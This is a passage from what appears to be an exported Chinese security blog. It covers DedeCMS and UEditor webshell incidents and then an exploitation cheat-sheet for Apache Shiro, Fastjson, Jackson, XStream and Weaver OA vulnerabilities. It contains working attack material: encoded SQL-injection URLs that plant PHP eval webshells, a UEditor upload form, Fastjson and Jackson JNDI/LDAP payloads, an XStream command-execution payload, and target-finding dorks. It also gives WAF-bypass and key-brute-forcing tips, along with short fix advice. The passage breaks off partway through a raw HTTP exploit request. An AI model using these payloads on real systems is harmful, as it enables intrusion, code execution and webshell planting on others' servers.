rrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35 执行EXP后，相应后台数据库表变为如下： （4）因此相应后台登录用户变为spider密码admin 利用方式二：通过/plus/mytag_js.php文件生成一句话木马php （1）如：构造如下注入SQL语句： `cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@',’{dede:php}file_put_contents(‘’90sec.php’’,’’‘’);{/dede:php}’) # @'`` （2）对应的EXP: ?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=116&amp;arrs2[]=97&amp;arrs2[]=103&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=40&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=44&amp;arrs2[]=101&amp;arrs2[]=120&amp;arrs2[]=112&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=44&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=41&amp;arrs2[]=32&amp;arrs2[]=86&amp;arrs2[]=65&amp;arrs2[]=76&amp;arrs2[]=85&amp;arrs2[]=69&amp;arrs2[]=83&amp;arrs2[]=40&amp;arrs2[]=57&amp;arrs2[]=48&amp;arrs2[]=49&amp;arrs2[]=51&amp;arrs2[]=44&amp;arrs2[]=64&amp;arrs2[]=96&amp;arrs2[]=92&amp;arrs2[]=39&amp;arrs2[]=96&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=123&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=58&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=125&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=57&amp;arrs2[]=48&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=103&amp;arrs2[]=117&amp;arrs2[]=105&amp;arrs2[]=103&amp;arrs2[]=101&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=123&amp;arrs2[]=47&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=58&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=125&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=32&amp;arrs2[]=35&amp;arrs2[]=32&amp;arrs2[]=64&amp;arrs2[]=96&amp;arrs2[]=92&amp;arrs2[]=39&amp;arrs2[]=96 （3）执行EXP后，将向数据库表dede_mytag中插入一条记录， （4）执行如下语句，在/plus目录下生成90sec.php一句话木马 http://www.xxxx.com/plus/mytag_js.php?aid=9013 利用方式三：使/plus/ad_js.php文件变为一句话木马php （1）如：构造如下注入SQL语句： cfg_dbprefixmyadSETnormbody= '&lt;?php file_put_contents(''read.php'',''&lt;?php eval($_POST[x]);echo mOon;?&gt;'');?&gt;' WHEREaid =19 #` （2）对应的EXP: /plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=32&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=120&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=104&amp;arrs2[]=111&amp;arrs2[]=32&amp;arrs2[]=109&amp;arrs2[]=79&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=87&amp;arrs2[]=72&amp;arrs2[]=69&amp;arrs2[]=82&amp;arrs2[]=69&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35 （3）执行EXP后，将向数据库表dede_myad中插入一条记录。 （4）进一步访问/plus/ad_js.php?aid=19 即可在plus目录生成read.php脚本文件。 如何清除？ 1、删除网站目录中的webshell 2、清除dede_myad、dede_mytag数据库表中插入的SQL语句，防止再次被调用生成webshell。 如何防御？ 网站采用开源CMS搭建，建议及时对官方发布的系统补丁以及内核版本进行升级。 第9篇：编辑器入侵事件UEditor是百度的一个javascript编辑器的开源项目，很多开发人员都喜欢引用这个编辑器，但这个编辑器官网版本一直停留在2016-05-26，已经很久没有更新了。 0x01 现象描述HIDS预警：发现后门(Webshell)文件，建议您立即进行处理。 0x02 事件分析1、发现Webshell 通过预警信息，找到木马文件路径： 备注：紧急处理，通过禁止动态脚本在上传目录的运行权限，使webshell无法成功执行。 2、定位文件上传时间 根据Webshell文件创建时间，2020年3月9日 15:08:34 3、Web访问日志关联分析 由于，IIS日志时间与系统时间相差8小时，系统时间是15:08，我们这里查看的是 7:08的日志时间。 2020-03-09 07:08:34 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage ................... ................... 2020-03-09 07:08:35 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage 找到对应的网站访问日志，在文件创建时间隔间里，我们会注意到这样两个ueditor的访问请求，初步怀疑是UEditor编辑器任意文件上传漏洞。 4、本地漏洞复现 A、本地构建一个html &lt;form action=\"http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage\"enctype=\"application/x-www-form-urlencoded\" method=\"POST\"&gt; &lt;p&gt;shell addr:&lt;input type=\"text\" name=\"source[]\" /&gt;&lt;/p &gt; &lt;inputtype=\"submit\" value=\"Submit\" /&gt; &lt;/form&gt; B、上传webshell，上传成功 经漏洞复现，确认UEditor编辑器任意文件上传漏洞。 5、还原攻击者行为 通过相关文件的访问记录进行关联分析，攻击者通过 ueditor编辑器成功上传webshell。 0x03 事件处理1、删除Webshell 清楚已发现的webshell，并尝试查找可能隐藏的webshell。 2、代码完整性验证 我们来思考一个问题，如果有一个免杀的Webshell隐藏在数以万行的代码中，怎么搞？ 文件完整性校验，检查网站的源码是否被篡改过。 操作过程： 通过查看服务器上已部署的源代码版本，找研发同事要同样版本的代码。把纯净源码的所有文件计算一次hash值保存，再到服务器上执行一次hash值，通过比对hash值，输出新创建的/被修改过的/删除的文件列表。 3、系统入侵排查 对系统做一个整体排查，确认是否存在后门 4、代码修复 反馈给相关开发人员进行代码修复。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://yoursite.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[]},{"title":"漏洞利用","slug":"漏洞利用","date":"2020-07-08T06:09:34.199Z","updated":"2020-07-31T09:04:03.533Z","comments":true,"path":"2020/07/08/漏洞利用/","link":"","permalink":"http://yoursite.com/2020/07/08/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"来自《斗象科技》武器库","text":"来自《斗象科技》武器库 第一节Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)1. 漏洞简介 Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用 2. 影响组件 Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响) 3. 漏洞指纹 set-Cookie: rememberMe=deleteMe或者URL中有shiro字样有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可 4. Fofa Dork app=\"Apache-Shiro\" 5. 漏洞分析 【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞https://paper.seebug.org/shiro-rememberme-1-2-4/ 6. 漏洞利用 wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具https://github.com/wyzxxz/shiro_rce Apache Shiro回显poc改造计划https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw 7. 利用技巧 1.使用多个泄露的key进行遍历, 这个在实战中确实有效 关于Shiro反序列化漏洞的延伸—升级shiro也能被shellhttps://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw Shiro 100 Keyhttps://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA 2.使用 URLDNS 进行检测提速 使用适应性最强的URLDNS(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测 且可以使用ysoserial提前生成序列化内容 java -jar target/ysoserial-0.0.5-SNAPSHOT-all.jar URLDNS \"http://1234567890.test.ceye.io\" &gt; urldns.ser 然后使用占位符+目标url hash的方法修改序列化内容中的urldns地址 提高检测速度以及后续检测无需使用ysoserial 例如 1234567890.test.ceye.io 可以换成 md5('www.qq.com').hexdigest() [:10].test.ceye.io 也就是 9d2c68d82d.test.ceye.io 可以预先记录 hash 9d2c68d82d www.qq.com 然后进行hash查表就可以知道是DNSLOG来自哪个目标, 性能会提高不少 3.已知目标使用了Shiro, 可以采取Shiro-721的报错逻辑来进行遍历key — 星光哥 这样即使DNS不能出网, 也可以通过是否返回 rememberMe=deleteMe 来断定 shiro key 的正确性, 前提是服务器有rememberMe=deleteMe相关回显 8. 防护方法 1.升级Shiro到最新版 2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上 3.WAF拦截Cookie中长度过大的rememberMe值 Apache Shiro Padding Oracle Attack (Shiro-721)1. 漏洞简介 Apache Shiro 是企业常见的 Java安全框架, 由于Shiro使用AES-CBC模式进行加解密处理, 所以存在Padding Oracle Attack漏洞, 已经登录的攻击者同样可以进行反序列化操作 2. 影响组件 Apache Shiro &lt; 1.4.2 3. 漏洞指纹 set-Cookie: rememberMe=deleteMeURL中有shiro字样有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可 4. Fofa Dork app=\"Apache-Shiro\" 5. 漏洞分析 Shiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台https://www.anquanke.com/post/id/193165 Apache Shiro 远程代码执行漏洞复现 – OnionT’s Bloghttp://www.oniont.cn/index.php/archives/298.html 6. 漏洞利用 wuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack)https://github.com/wuppp/shiro_rce_exp 7. 利用技巧 1.该漏洞需要登录后获取到合法的Cookie: rememberMe=XXX后才可以进行利用, 看起来不是很好利用 但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥 所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性 2.如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 rememberMe 8. 防护方法 1.升级Shiro到最新版 2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上 3.WAF拦截Cookie中长度过大的rememberMe值 4.WAF拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie Apache Shiro 权限绕过漏洞 (Shiro-682)1. 漏洞简介 Apache Shiro 是企业常见的Java安全框架, 由于Shiro的拦截器和spring(Servlet)拦截器对于URI模式匹配的差异, 导致出现鉴权问题 2. 影响组件 Apache Shiro &lt; 1.5.2 3. 漏洞指纹 set-Cookie: rememberMe=deleteMe或者URL中有shiro字样有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可 4. Fofa Dork app=\"Apache-Shiro\" 5. 漏洞分析 Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/ 6. 漏洞利用 Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/ 7. 利用技巧 1.url中间可以尝试添加 ../ , 不限于这个漏洞, 可能会有惊喜, 错误的Nginx配置也会造成新的漏洞 关于url解析的问题可以参考以下链接 A New Era of SSRF – Exploiting URL Parser in Trending Programming Languages!https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf Tomcat URL解析差异性导致的安全问题 – 先知社区https://xz.aliyun.com/t/7544 8. 防护方法 1.升级1.5.2版本及以上 2.尽量避免使用*通配符作为动态路由拦截器的URL路径表达式. Fastjson 反序列化远程代码执行漏洞1. 漏洞简介 Fastjosn 无疑是这两年的漏洞之王, 一手反序列化RCE影响无数厂商, 目前1.2.48以下版本稳定受影响, 1.2.68以下版本开启Autotype会受到影响 (不排除传说中的1.2.67以下RCE漏洞, 期待八仙过海) 2. 影响组件 Fastjson &lt; 1.2.48 (&lt;1.2.68?) 3. 漏洞指纹 可以通过DNS回显的方式检测后端是否使用Fastjson {\"@type\":\"java.net.Inet4Address\", \"val\":\"dnslog\"} {\"@type\":\"java.net.Inet6Address\", \"val\":\"dnslog\"} {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"val\":\"dnslog\"}} {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"dnslog\"}}\"\"} {{\"@type\":\"java.net.URL\", \"val\":\"dnslog\"}:\"aaa\"} Set[{\"@type\":\"java.net.URL\", \"val\":\"dnslog\"}] Set[{\"@type\":\"java.net.URL\", \"val\":\"dnslog\"} {{\"@type\":\"java.net.URL\", \"val\":\"dnslog\"}:0 可以通过DOS时间延迟或者报错回显的方式检测 无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/ fastjson &lt; 1.2.66 版本最新漏洞分析https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q 4. Fofa Dork 5. 漏洞分析 Fastjson &lt;=1.2.47 远程代码执行漏洞分析 – 安全客, 安全资讯平台https://www.anquanke.com/post/id/181874 6. 漏洞利用 1.JDK降级编译 CaijiOrz/fastjson-1.2.47-RCE: Fastjson &lt;= 1.2.47 远程命令执行漏洞利用工具及方法https://github.com/CaijiOrz/fastjson-1.2.47-RCE 源项目中最后一句 当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java 这里并不需要更换jdk版本, 我们可以使用JDK降级编译的手法, 这样1.8的jdk也可以编译出来1.7版本的.class , 相信可以解决很多小伙伴的问题 javac -source 1.7 -target 1.7 Exploit.java 1.2.47版本以下通杀Poc: {\"name\":{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\"}, \"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://asdfasfd/\", \"autoCommit\":true}}, age:11} 其中{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://asdfasfd/\", \"autoCommit\":true}也可以替换成其他利用链 2.优先使用LDAP协议 根据实战中经验, 这里更推荐使用ldap协议进行漏洞利用, 原因如下 RMI协议的利用方式 在JDK 6u132/7u122/8u113 及以上版本中修复了LDAP协议的利用方式 在JDK 6u211/7u201/8u191 及以上版本中修复了 所以,LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制 如何绕过高版本JDK的限制进行JNDI注入 – FreeBuf专栏·安全引擎https://www.freebuf.com/column/207439.html 7. 利用技巧 1.如何查看服务器的jdk版本呢, 这里也有个小技巧 nc -lvvp 80#[marshalsec中指定的HTTP端口] 当服务器连接过来时, User-Agent中会标明当前服务器的JDK版本 2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上] fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjsonhttps://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java public class GenericFastJsonRedisSerializer implements RedisSerializer&lt;Object&gt; { private final static ParserConfig defaultRedisConfig = new ParserConfig(); static { defaultRedisConfig.setAutoTypeSupport(true);} 其他消息队列之类的都是同理 8. 防护方法 1.升级Fastjson到最新版(&gt;=1.2.68 新增了safemode, 彻底关闭autotype)2.WAF拦截过滤请求包中的 @type, %u0040%u0074%u0079%u0070%u0065, \\u0040type, \\x04type 等多种编码的autotype变形 3.最少升级到1.2.48以上版本且关闭autotype选项 4.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上 Jackson 反序列化远程代码执行漏洞1. 漏洞简介 Jackson 跟Fastjson一样, 当enableDefaultTyping开启时, 也是可以进行反序列化到代码执行 2. 影响组件Jackson 3. 漏洞指纹 无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/ 4. Fofa Dork 5. 漏洞分析 跟Fastjson漏洞原理都是一样的, 每次修复基本都是更新黑名单, 漏洞分析可以参考 Jackson-databind-2670远程代码执行漏洞简单分析 – 先知社区https://xz.aliyun.com/t/7506 6. 漏洞利用 learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabughttps://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson POC [\"ch.qos.logback.core.db.JNDIConnectionSource\", {\"jndiLocation\":\"ldap://localhost:43658/Calc\"}] 7. 利用技巧 1.把Fastjson的利用链拿过来改一改就可以用, 前提是环境中存在可用的利用链 8. 防护方法 1.升级Jackson到最新版(enableDefaultTyping默认都是关的, 问题不大) 2.确保enableDefaultTyping是关闭的 3.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上 Xstream 反序列化漏洞1. 漏洞简介 Xstream Java 中经常用于处理 xml 的库, 最近一次修复中(1.4.10版本)重现了历史反序列化远程代码执行漏洞, 所以也需要关注 2. 影响组件 Xstream &lt;1.4.6, =1.4.10 3. 漏洞指纹 xml 4. Fofa Dork 5. 漏洞分析 XStream反序列化组件攻击分析 | angelwhu_bloghttps://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ 6. 漏洞利用 XStream反序列化组件攻击分析 | angelwhu_bloghttps://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ import com.thoughtworks.xstream.XStream; import java.io.IOException; public class Main { // POC1 public static void main(String[] args) throws IOException { XStream xStream = new XStream(); String payload = \"&lt;sorted-set&gt;\\n\" + \" &lt;string&gt;foo&lt;/string&gt;\\n\" + \" &lt;dynamic-proxy&gt;\\n\" + \" &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\\n\" + \" &lt;handler class=\\\"java.beans.EventHandler\\\"&gt;\\n\" + \" &lt;target class=\\\"java.lang.ProcessBuilder\\\"&gt;\\n\" + \" &lt;command&gt;\\n\" + \" &lt;string&gt;cmd.exe&lt;/string&gt;\\n\" + \" &lt;string&gt;/c&lt;/string&gt;\\n\" + \" &lt;string&gt;calc&lt;/string&gt;\\n\" + \" &lt;/command&gt;\\n\" + \" &lt;/target&gt;\\n\" + \" &lt;action&gt;start&lt;/action&gt;\"+ \" &lt;/handler&gt;\\n\" + \" &lt;/dynamic-proxy&gt;\\n\" + \"&lt;/sorted-set&gt;\\n\"; //POC2 // String payload = \"&lt;java.util.PriorityQueue serialization=\\\"custom\\\"&gt;\\n\" + // \" &lt;unserializable-parents/&gt;\\n\" + // \" &lt;java.util.PriorityQueue&gt;\\n\" + // \" &lt;default&gt;\\n\" + // \" &lt;size&gt;2&lt;/size&gt;\\n\" + // \" &lt;comparator class=\\\"org.apache.commons.beanutils.BeanComparator\\\"&gt;\\n\" + // \" &lt;property&gt;databaseMetaData&lt;/property&gt;\\n\" + // \" &lt;comparator class=\\\"java.util.Collections$ReverseComparator\\\"/&gt;\\n\" + // \" &lt;/comparator&gt;\\n\" + // \" &lt;/default&gt;\\n\" + // \" &lt;int&gt;3&lt;/int&gt;\\n\" + // \" &lt;com.sun.rowset.JdbcRowSetImpl serialization=\\\"custom\\\"&gt;\\n\" + // \" &lt;javax.sql.rowset.BaseRowSet&gt;\\n\" + // \" &lt;default&gt;\\n\" + // \" &lt;concurrency&gt;1008&lt;/concurrency&gt;\\n\" + // \" &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\\n\" + // \" &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\\n\" + // \" &lt;fetchSize&gt;0&lt;/fetchSize&gt;\\n\" + // \" &lt;isolation&gt;2&lt;/isolation&gt;\\n\" + // \" &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\\n\" + // \" &lt;maxRows&gt;0&lt;/maxRows&gt;\\n\" + // \" &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\\n\" + // \" &lt;readOnly&gt;true&lt;/readOnly&gt;\\n\" + // \" &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\\n\" + // \" &lt;showDeleted&gt;false&lt;/showDeleted&gt;\\n\" + // \" &lt;dataSource&gt;ldap://ip:1389/Object&lt;/dataSource&gt;\\n\" + // \" &lt;params/&gt;\\n\" + // \" &lt;/default&gt;\\n\" + // \" &lt;/javax.sql.rowset.BaseRowSet&gt;\\n\" + // \" &lt;com.sun.rowset.JdbcRowSetImpl&gt;\\n\" + // \" &lt;default&gt;\\n\" + // \" &lt;iMatchColumns&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;int&gt;-1&lt;/int&gt;\\n\" + // \" &lt;/iMatchColumns&gt;\\n\" + // \" &lt;strMatchColumns&gt;\\n\" + // \" &lt;string&gt;foo&lt;/string&gt;\\n\" + // \" &lt;null/&gt;\\n\" + // \" &lt;null/&gt;\\n\" + // \" &lt;null/&gt;\\n\" + // \" &lt;null/&gt;\\n\" + // \" &lt;null/&gt;\\n\" + // \" &lt;null/&gt;\\n\" + // \" &lt;null/&gt;\\n\" + // \" &lt;null/&gt;\\n\" + // \" &lt;null/&gt;\\n\" + // \" &lt;/strMatchColumns&gt;\\n\" + // \" &lt;/default&gt;\\n\" + // \" &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\\n\" + // \" &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\\n\" + // \" &lt;com.sun.rowset.JdbcRowSetImpl reference=\\\"../com.sun.rowset.JdbcRowSetImpl\\\"/&gt;\\n\" + // \" &lt;/java.util.PriorityQueue&gt;\\n\" + // \"&lt;/java.util.PriorityQueue&gt;\"; xStream.fromXML(payload); } } 7. 利用技巧 1.这里 Xstream 同样影响很多使用它的开源组件, 比如Spring系列 Maven Repository: com.thoughtworks.xstream » xstream » 1.4.10 (Usages)https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages 2.xml 不仅可以xxe, 还能反序列化代码执行 2.xxe 漏洞用 xxer, 方便快捷 TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab.https://github.com/TheTwitchy/xxer 8. 防护方法 1.升级到最新版 泛微OA Bsh 远程代码执行漏洞1. 漏洞简介 2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重. 2. 影响组件泛微OA 3. 漏洞指纹 Set-Cookie: ecology_JSessionId= ecology /weaver/bsh.servlet.BshServlet 4. Fofa Dork app=\"泛微-协同办公OA\" 5. 漏洞分析 泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台https://www.freebuf.com/vuls/215218.html https://github.com/beanshell/beanshell http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI 6. 漏洞利用 Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysishttps://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204 POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* 